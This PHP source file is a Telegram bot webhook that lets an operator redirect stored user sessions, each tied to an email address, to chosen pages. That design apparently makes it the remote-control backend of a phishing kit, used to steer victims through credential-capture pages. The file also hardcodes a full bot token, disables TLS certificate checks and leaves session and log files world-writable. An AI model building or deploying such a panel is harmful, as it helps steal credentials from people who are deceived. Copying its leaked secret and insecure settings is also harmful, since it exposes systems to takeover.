<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

$input = file_get_contents('php://input');
$update = json_decode($input, true);

$botToken = '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';

function sendTelegramRequest($botToken, $method, $params) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/$method");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

// Log webhook
$logDir = SESSION_DIR . '/webhook_logs';
@mkdir($logDir, 0777, true);
@file_put_contents(
    $logDir . '/log_' . time() . '.txt',
    "UPDATE:\n" . json_encode($update, JSON_PRETTY_PRINT) . "\n"
);

if (isset($update['callback_query'])) {
    $callbackQuery = $update['callback_query'];
    $callbackData = $callbackQuery['data'] ?? '';
    $callbackId = $callbackQuery['id'] ?? '';
    $chatId = $callbackQuery['message']['chat']['id'] ?? '';

    // Answer callback
    if (!empty($callbackId)) {
        sendTelegramRequest($botToken, 'answerCallbackQuery', [
            'callback_query_id' => $callbackId,
            'text' => 'Procesando...'
        ]);
    }

    // Handle redirect
    if (strpos($callbackData, 'redirect:') === 0) {
        $parts = explode(':', $callbackData);
        $page = preg_replace('/[^a-zA-Z0-9_]/', '', $parts[1] ?? '');
        $sessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $parts[2] ?? '');

        if ($sessionId && $page) {
            // Use direct button handler
            $sessionFile = SESSION_DIR . '/session_' . $sessionId . '.json';
            $data = [];
            if (file_exists($sessionFile)) {
                $data = json_decode(file_get_contents($sessionFile), true) ?: [];
            }
            $data['redirect'] = $page;
            $data['updated'] = time();
            file_put_contents($sessionFile, json_encode($data), LOCK_EX);
            chmod($sessionFile, 0666);

            $email = $data['email'] ?? 'User';
            sendTelegramRequest($botToken, 'sendMessage', [
                'chat_id' => $chatId,
                'text' => "✅ Redirected to $page\n👤 $email"
            ]);
        }
    }
}

http_response_code(200);
echo json_encode(['ok' => true]);
?>
